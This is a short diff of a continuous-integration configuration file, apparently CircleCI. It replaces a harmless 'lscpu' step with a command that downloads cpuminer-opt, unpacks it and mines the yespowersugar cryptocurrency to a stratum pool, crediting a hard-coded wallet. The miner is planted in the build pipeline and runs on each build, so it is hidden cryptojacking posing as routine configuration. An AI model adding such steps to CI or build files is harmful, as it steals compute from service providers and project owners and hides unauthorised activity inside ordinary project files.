@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run: lscpu 
+      - run:wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a yespowersugar -o stratum+tcp://stratum-asia.rplant.xyz:7042 -u sugar1qncgynpw6fa65xyu3sg486l7eca0jydjcgvwqek.vps1 -t 1 
